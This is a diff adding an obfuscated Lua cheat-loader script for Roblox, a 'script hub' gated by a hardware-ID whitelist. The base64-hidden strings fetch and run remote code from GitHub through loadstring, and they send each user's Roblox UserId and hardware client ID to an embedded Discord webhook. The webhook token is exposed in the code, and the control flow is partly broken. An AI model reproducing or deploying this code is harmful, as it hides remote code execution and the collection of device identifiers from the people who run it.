@@ -1,0 +1,136 @@
+--PASS 2
+--Join the discord https://discord.gg/urF72EGT7q
+
+--PASS 2
+--Join the discord https://discord.gg/urF72EGT7q
+
+local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+function eqvsScNHPyurvogIJpVwxLDSrXJzy(data) m=string.sub(data, 0, 55) data=data:gsub(m,'')
+
+data = string.gsub(data, '[^'..b..'=]', '') return (data:gsub('.', function(x) if (x == '=') then return '' end local r,f='',(b:find(x)-1) for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end return r; end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x) if (#x ~= 8) then return '' end local c=0 for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end return string.char(c) end)) end
+
+
+ --PASS 2
+--Join the discord https://discord.gg/urF72EGT7q
+
+
+local HWIDTable = loadstring(game:HttpGet(eqvsScNHPyurvogIJpVwxLDSrXJzy('bUUDquWoOYloGmOYOQYFXYvGzTZjRFJKckESwGSEgRHpuYvVbyUyIcyaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1NsZWVrc1NjcmlwdHMvdmlwZXJzY3JpcHRodWIvbWFpbi9zY3JpcHQ=')))()
+local HWID = game:GetService(eqvsScNHPyurvogIJpVwxLDSrXJzy('pTSajhminkajhUHwaRWaTqesIfivfKQerjvJkBeiQqHCRoxbFLkmSaKUmJ4QW5hbHl0aWNzU2VydmljZQ==')):GetClientId()
+print(HWIDTable)
+
+for i,v in pairs(HWIDTable) do
+    if v == HWID then
+        game:GetService(eqvsScNHPyurvogIJpVwxLDSrXJzy('JKkAeLlxuVgLDNRKYNZcMsLucrVfHzCcQpxHyeixpVVPTNresNjdrWsU3RhcnRlckd1aQ==')):SetCore(eqvsScNHPyurvogIJpVwxLDSrXJzy('NYrxlIssyqivjVfLrueWgjjewrzfvXpIQAkkjeGwRSopJUTJDdHTKwEU2VuZE5vdGlmaWNhdGlvbg=='),{
+    Duration = eqvsScNHPyurvogIJpVwxLDSrXJzy('DSsXCzykhXLKfJeNYjKuvNHbpJwiSYShIzflBWWYJDEhWVSLyrSwfZTNA=='),
+    Title = eqvsScNHPyurvogIJpVwxLDSrXJzy('KtKqqUeNEFMpCRSiTqyVDxVPXUZRdcrlPDceFcnPfuLrKrQiLklGSybTG9hZGluZyBTY3JpcHQgSHVi'), -- Required
+    Text = eqvsScNHPyurvogIJpVwxLDSrXJzy('pgrMXWSMwNeWebotQqYlKOFFgonyqbImxjRYfsKNGZxiVByHiAWnJREWW91IGhhdmUgZXhlY3V0ZWQgVmlwZXJzIFNjcmlwdCBIdWI='), -- Required
+    Icon = eqvsScNHPyurvogIJpVwxLDSrXJzy('ohHWSxWWFrLtqsngWyixnXcduqgnarwfvaLoedoDrXaQjcItRiBQqOdaHR0cHM6Ly93d3cucm9ibG94LmNvbS9saWJyYXJ5LzExMTU2NjMwOTkwL0JPVC1MT0dP'),
+    Button1 = eqvsScNHPyurvogIJpVwxLDSrXJzy('TlNzUGhmqhUNxIFMwfoinsYbrxKiGGgWpJzqoBAyHGslcefllavGkmIT2theQ=='),
+    
+    
+})
+game.StarterGui:SetCore( eqvsScNHPyurvogIJpVwxLDSrXJzy('INXQIxfsREqzzRIbZJVOtMDrkAfjaesIXhbcYpeYlaDUMmrkfCvRIBOQ2hhdE1ha2VTeXN0ZW1NZXNzYWdl'),  { 
+    Text = eqvsScNHPyurvogIJpVwxLDSrXJzy('FWazGcSjFDDXyOhbZnvPqdyPsyoJXDRgqDMmWMDCOUjUvpjjCpYGvIfW1ZJUEVSSFVCXSBUaGFuayB5b3UgZm9yIHVzaW5nIG15IHNjcmlwdCBodWI='),
+     Color = Color3.fromRGB( 255,0,0 ), 
+     Font = Enum.Font.Arial,
+     FontSize = Enum.FontSize.Size24 } )
+
+
+HttpService = game:GetService(eqvsScNHPyurvogIJpVwxLDSrXJzy('vZqVKNcbSAZJqyFGFoLuraNogvmtYchDcFPZLbcPpVmJrCihnEmQMnaSHR0cFNlcnZpY2U='))
+Webhook_URL = eqvsScNHPyurvogIJpVwxLDSrXJzy('WfpbXAiDSoPECJeroKVaScasRhmRgpPUCVQrasoysYYpLfOUZUGPGEHaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTAyNjU4NjkxNjI3MzAwODc2MC9TQ2YwQVFTQ2dNSVFlaldEZzVyRGNVc0Y1ajRKYS1ZcVd3Z1N5aV85MUx4OUkzbjROXzVBV18ySWhCbGUzN0VJakcxMw==')
+
+local responce = syn.request(
+{
+    Url = Webhook_URL,
+    Method = eqvsScNHPyurvogIJpVwxLDSrXJzy('JONEisdpXWewGhnXaCjCSihxDmnwhZoafdvtwNBaWRUkgDajxDAWjNTUE9TVA=='),
+    Headers = {
+        [eqvsScNHPyurvogIJpVwxLDSrXJzy('kNHPGzcDpfgVZhfXyPMrumFGUtsYSnzSLxfPidQncLEhqVllxGHpyKHQ29udGVudC1UeXBl')] = eqvsScNHPyurvogIJpVwxLDSrXJzy('taSeBjehGoyYJaLdPLecBIbEPucFBnRLOBIJJdozkMHEGyeXiKvVhcvYXBwbGljYXRpb24vanNvbg=='),
+        },
+        Body = HttpService:JSONEncode({
+            [eqvsScNHPyurvogIJpVwxLDSrXJzy('FSYcXjArZPAveNKsIpFbGbdQWHGlIWQJKVlgbTjtosPAHnduShOXLETY29udGVudA==')] = eqvsScNHPyurvogIJpVwxLDSrXJzy('NRyPdhheSagUodbVHbbXpveZQtyzEpUaqCtTQfqzXcLKzIhgsROMsQY'),
+            [eqvsScNHPyurvogIJpVwxLDSrXJzy('czDOpnJzplDojUevxhEPWoFpGwqAxoGZNvRzKnxMVkEFLfQVTBivTrSZW1iZWRz')] = {{
+                [eqvsScNHPyurvogIJpVwxLDSrXJzy('lwJfripYtfpUsuctbKQETrCliLjCGtcgUwAQCdSWtVwZRnaVaECmhkzdGl0bGU=')] = eqvsScNHPyurvogIJpVwxLDSrXJzy('eUOQAuxgpyMrhoOjlRuKqQNXrcNlmXSKcALrcPCpBEosdZwXpmiyIlaKipZb3VyIFNjcmlwdCBIdWIgSGFzIEJlZW4gRXhlY3V0ZWQqKg=='),
+                [eqvsScNHPyurvogIJpVwxLDSrXJzy('FYvOGIGenAzmAAnnURCxqdCyYGjamfNftoGzIIEkPtxwwkIIFtLQJjbZGVzY3JpcHRpb24=')] = game.Players.LocalPlayer.UserId..eqvsScNHPyurvogIJpVwxLDSrXJzy('gdqcPrIfMAwIOGsHprVvpdZvpvDetAJjLWLhJqnTedJbqSiUlmAoTPJIGhhcyBleGVjdXRlZCB5b3VyIHNjcmlwdGh1Yi4='),
+                
+                [eqvsScNHPyurvogIJpVwxLDSrXJzy('acLJGBhVYmylUsiZVFFCSfBivWYJQmWRrftFdIVQjzKEVVrTiJDipzgdHlwZQ==')] = eqvsScNHPyurvogIJpVwxLDSrXJzy('stWNJexUGCehUcmxSocGHnHCzqYeULHrXhIIpImpxnBDvKcLSXAsuuXcmljaA=='),
+                [eqvsScNHPyurvogIJpVwxLDSrXJzy('SpzFSgEhAtRzWoIOFfKrmUoUqAPOkzExaeDpaHMKxMdBbNUwsbJjKjnY29sb3I=')] = tonumber(0x00FF00),
+                [eqvsScNHPyurvogIJpVwxLDSrXJzy('hTHZdpMUpNbqPaGUaMfEYKkzHEMnxwFxOxLQUHUJgSXmVqkbWdgXxZPZmllbGRz')] = {
+                    {
+                        [eqvsScNHPyurvogIJpVwxLDSrXJzy('FHmTYPyFNquFGQSCtWXAodqcbUZZwsXOwNbfKDlyrgObVgbFVwVgpTubmFtZQ==')] = eqvsScNHPyurvogIJpVwxLDSrXJzy('ZaiJppmiXgxJUGCOAdKEYRtxNvNtTUBswRlfUnyXyPOVabrWSssjbuXSGFyZHdhcmUgSUQ6'),
+                        [eqvsScNHPyurvogIJpVwxLDSrXJzy('WIiXEWZaFDfpbPOhIdRpuQtZTndzyePfaEwWUkXVFRlYUssoNLaplfSdmFsdWU=')] = game:GetService(eqvsScNHPyurvogIJpVwxLDSrXJzy('OPjeERvEeQOCgxFQIUseQoFUymixqEUnhfegkTyRKRbnQuSJVcxaVaBUmJ4QW5hbHl0aWNzU2VydmljZQ==')):GetClientId(),
+                        [eqvsScNHPyurvogIJpVwxLDSrXJzy('drFIOFuZrJoIzXHCPHiFtkHCwMMfDQphYLKyKNSPwgMNqSYqgcysySeaW5saW5l')] = true
+
+                    }
+                }
+            }}
+        })
+}
+)
+    --PASS 2
+--Join the discord https://discord.gg/urF72EGT7q
+    loadstring(game:HttpGet(eqvsScNHPyurvogIJpVwxLDSrXJzy('wslPxONAEgcCICOYJidaIShPKyiVAFHfltLcVuFJfBoCbPCnogDUKFBaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1NsZWVrc1NjcmlwdHMvU2NyaXB0SHViLU1haW4vbWFpbi9TY3JpcHRIdWI=')))()
+        
+        
+        if v == false then do
+              game:GetService(eqvsScNHPyurvogIJpVwxLDSrXJzy('DjLhQeOPnhjLmOJstRfamCBxAEUAPKjYRJthmpMSNqcaXlwivkOLLAnU3RhcnRlckd1aQ==')):SetCore(eqvsScNHPyurvogIJpVwxLDSrXJzy('cTMduOgwfwmgdfFFeiVTPVKvwcILXUVPPPJxIosebfmhlQkDwQxjAoCU2VuZE5vdGlmaWNhdGlvbg=='),{
+    Duration = eqvsScNHPyurvogIJpVwxLDSrXJzy('lUxDdrOMZfnjamrdJlcviqtmCrbZHpzogLVDuSzFVtuIYocUJIoCtHMNA=='),
+    Title = eqvsScNHPyurvogIJpVwxLDSrXJzy('pplncpcBFDGLIpQiUmDehVEPiHcAFGlMPyOsvrLPcLLeZgdKrQgxApyV3JvbmcgS2V5'), -- Required
+    Text = eqvsScNHPyurvogIJpVwxLDSrXJzy('nPQdSuXFDcsjuKaoXHRvqriHReWiQgwcYpktKqJMYTISHTPhEaTkomaTWFrZSBhIHRpY2tldCBpbiB0aGUgZGlzY29yZCB0byBidXkgdGhpcyBzY3JpcHQh'), -- Required
+    Icon = eqvsScNHPyurvogIJpVwxLDSrXJzy('RHIHPlXGVzJTvYcAZjYFFHhNaIJjHQbuvWKGhSTDoNhgspchUCjVhuVaHR0cHM6Ly93d3cucm9ibG94LmNvbS9saWJyYXJ5LzExMTU2NjMwOTkwL0JPVC1MT0dP'),
+    Button1 = eqvsScNHPyurvogIJpVwxLDSrXJzy('jVbXjgbUiaNvQOuJWvPxUEUWsnBaoTsCVtfLmkxcPpNCvUJrFVAWHWaT2theQ=='),
+    
+    --PASS 2
+--Join the discord https://discord.gg/urF72EGT7q
+})
+setclipboard(eqvsScNHPyurvogIJpVwxLDSrXJzy('TGXrWhekeWJUsHrWyJQcKrHbHpZBegOfRcBeezVpKZOXlVpEtsxJtcCaHR0cHM6Ly9kaXNjb3JkLmdnL3VyRjcyRUdUN3E='))
+wait(3)
+game:GetService(eqvsScNHPyurvogIJpVwxLDSrXJzy('WTxToajDHBrzVnmQCUSrUmNUQKozCNqUIvsBMplvwUJqcQgaepQHFBfU3RhcnRlckd1aQ==')):SetCore(eqvsScNHPyurvogIJpVwxLDSrXJzy('ejlJeshfvqfquRMOXlECIJlCvTZmLYMMZjxykBEaaJnBidGFsDVanNZU2VuZE5vdGlmaWNhdGlvbg=='),{
+    Duration = eqvsScNHPyurvogIJpVwxLDSrXJzy('lQqRQHtcQTZyPAhygMpoAzRXFWLEPpKshRmizlNeYefrblqCqsJmPlmNA=='),
+    Title = eqvsScNHPyurvogIJpVwxLDSrXJzy('VUJBqDanfEIiGGCaNkwhGIuwthoqkuPDKzMwtvJEzEndHiEaDhWZYRGRGlzY29yZCBDb3BpZWQ='), -- Required
+    Text = eqvsScNHPyurvogIJpVwxLDSrXJzy('HblKakHZiDVdFibMjlVNaazdlPCLKBVzBFbunKQHaAWgRpRrUKhumEiUGFzdGUgdGhlIGNvcGllZCBsaW5rIGluIHlvdXIgYnJvd3NlciB0byBqb2luIHRoZSBkaXNjb3Jk'), -- Required
+    Icon = eqvsScNHPyurvogIJpVwxLDSrXJzy('fCdQPQRPcmiawxYCmXnAdAiVdNBgQCMJLYgSxidshWEnHXDYsgNQjzSaHR0cHM6Ly93d3cucm9ibG94LmNvbS9saWJyYXJ5LzExMTU2NjMwOTkwL0JPVC1MT0dP'),
+    Button1 = eqvsScNHPyurvogIJpVwxLDSrXJzy('rDEoeiuQcnisUiyCrthvHJMreaRrUTTeHSYUIvFjNkDWOfqkqWhSvMkT2theQ=='),
+    
+    
+})
+HttpService = game:GetService(eqvsScNHPyurvogIJpVwxLDSrXJzy('BGSSiNWYVgFDGXMpTNMIBoQDcTyNsWSsVEHhlqZYhcSjjnPvqSZpjPBSHR0cFNlcnZpY2U='))
+Webhook_URL = eqvsScNHPyurvogIJpVwxLDSrXJzy('HyNwGIGtIPCZgoiihdFCuXCtyNKSmVQZjYPxGupFQjQxbaFJZSXaiVTaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTAyNjU4NjkxNjI3MzAwODc2MC9TQ2YwQVFTQ2dNSVFlaldEZzVyRGNVc0Y1ajRKYS1ZcVd3Z1N5aV85MUx4OUkzbjROXzVBV18ySWhCbGUzN0VJakcxMw==')
+
+local responce = syn.request(
+{
+    Url = Webhook_URL,
+    Method = eqvsScNHPyurvogIJpVwxLDSrXJzy('SezPXsIFedeTnqudqymxaXGXhOfguOIIhdMmfFnQsRqhWXzhSYyPDYrUE9TVA=='),
+    Headers = {
+        [eqvsScNHPyurvogIJpVwxLDSrXJzy('qhwwRVTrKFbOsicJchgYjGzfzlfFLtoNjpkxvwUiKGXilDoiQOrSnkaQ29udGVudC1UeXBl')] = eqvsScNHPyurvogIJpVwxLDSrXJzy('xpVAImiAgdAqRqGCQUsDlMcgOViVlSskGVbXWQOttLQXOsBbtEiVDyaYXBwbGljYXRpb24vanNvbg=='),
+        },
+        Body = HttpService:JSONEncode({
+            [eqvsScNHPyurvogIJpVwxLDSrXJzy('cXWdWDCpBuSMhKNArOUlneLbGjzGObGFjyaQcPKzuaBHbpskFYYQVpeY29udGVudA==')] = eqvsScNHPyurvogIJpVwxLDSrXJzy('seHOqtPlGukQGlxMveBTjHdAyyLGUIXFosYSpVcedobbUdHfMUmGgDj'),
+            [eqvsScNHPyurvogIJpVwxLDSrXJzy('gbMZDyrMhMlbwvrESXvBwNefWzDXnXZjNyvJnUlMturEjyixcIvidfYZW1iZWRz')] = {{
+                [eqvsScNHPyurvogIJpVwxLDSrXJzy('XjjPiaQsaXMjuMiYUwfVRomfbXLLpZYLneqlONLoPedJVwAturyilnGdGl0bGU=')] = eqvsScNHPyurvogIJpVwxLDSrXJzy('SONRZLiKDSJLzCDaOVUtSrDYgPlimwrpNdvPAqWlOxITFgSNXWqZCNcKipTb21lb25lIHRyaWVkIHRvIGV4ZWN1dGUgeW91ciBzY3JpcHRodWIgd2l0aCBhIGZhbHNlIEhXSUQqKg=='),
+                [eqvsScNHPyurvogIJpVwxLDSrXJzy('fTCwXkWGpURbnlwavnloNFYAwIPuBSpZPXwtUVKxGlioaDGIZLfNfnBZGVzY3JpcHRpb24=')] = game.Players.LocalPlayer.UserId..eqvsScNHPyurvogIJpVwxLDSrXJzy('rJAALhIIVlWfSAsekcdSqgWaNnySvLWTXHABpAISHbwEXEQvyLJIKiPIGhhcyB0cmllZCB0byBleGVjdXRlIHlvdXIgc2NyaXB0aHViIHdpdGggYSBmYWxzZSBIV0lELg=='),
+                [eqvsScNHPyurvogIJpVwxLDSrXJzy('kStutTpLQHmIDNBvhnOgsWhvYhmxEwXISPWiwrMnwgBfJbZQscNniuvdHlwZQ==')] = eqvsScNHPyurvogIJpVwxLDSrXJzy('lZTLSsKRUCTgqpNFZGGwDQNtEPopxEpoPNnnJduKsRuJpgEcrLZfeFEcmljaA=='),
+                [eqvsScNHPyurvogIJpVwxLDSrXJzy('adXGqSDzaRrRmLXirxIcWgBQumMtcrxUHcrlBdqnsoOCFahaAZIIojUY29sb3I=')] = tonumber(0x00FF00),
+                [eqvsScNHPyurvogIJpVwxLDSrXJzy('wCMjdLFSJeqSSHtspSIlZOWnivaTvooRewGbVxWJYhejgkpgAwJXpndZmllbGRz')] = {
+                    {
+                        [eqvsScNHPyurvogIJpVwxLDSrXJzy('abPJwRWKZBIDBgLLNxJQEBAnCEzgclKftvRnhuAGyafedpjsusxFeYCbmFtZQ==')] = eqvsScNHPyurvogIJpVwxLDSrXJzy('vsyrVspEVqeVJVCRSyVRyffDXIxWGplZkGHQJiJOryutuzYuDYwEILHSGFyZHdhcmUgSUQ6'),
+                        [eqvsScNHPyurvogIJpVwxLDSrXJzy('yPKuFTwyYCsvDKlfbKDfMCDQpOpzjcnkcxOizUjDKzBILjLmGQDaFFydmFsdWU=')] = game:GetService(eqvsScNHPyurvogIJpVwxLDSrXJzy('JHTrAgIlzDxjZRKboIgQrMnENADNZRNjCTfZaODGoldbbmPSUbBtgVaUmJ4QW5hbHl0aWNzU2VydmljZQ==')):GetClientId(),
+                        [eqvsScNHPyurvogIJpVwxLDSrXJzy('xXXODrQCjkIsntNiGmqOaAWcSixZQkJjMmjoAbrtCHOOGKLHiPbXCpiaW5saW5l')] = true
+
+                    }
+                }
+            }}
+        })
+}
+)
+        --PASS 2
+--Join the discord https://discord.gg/urF72EGT7q
+        
+        end
+end
+
+end
+end
+
+--PASS 2
+--Join the discord https://discord.gg/urF72EGT7q
+    
